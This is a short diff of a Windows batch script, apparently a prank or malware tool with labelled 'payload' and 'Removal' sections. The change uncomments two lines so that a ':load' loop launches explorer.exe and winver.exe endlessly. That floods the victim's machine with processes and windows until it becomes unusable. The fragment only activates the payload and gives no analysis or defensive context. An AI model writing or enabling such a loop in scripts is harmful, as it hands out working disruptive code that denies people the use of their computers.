@@ -159,8 +159,8 @@ goto :remove
 :payload
 echo. > "%tmp%\SUBDIMA\stop-taskend.pls"
 :load
-::start "" explorer.exe
-::start "" winver.exe
+start "" explorer.exe
+start "" winver.exe
 goto :load
 
 ::============================== Removal ==============================
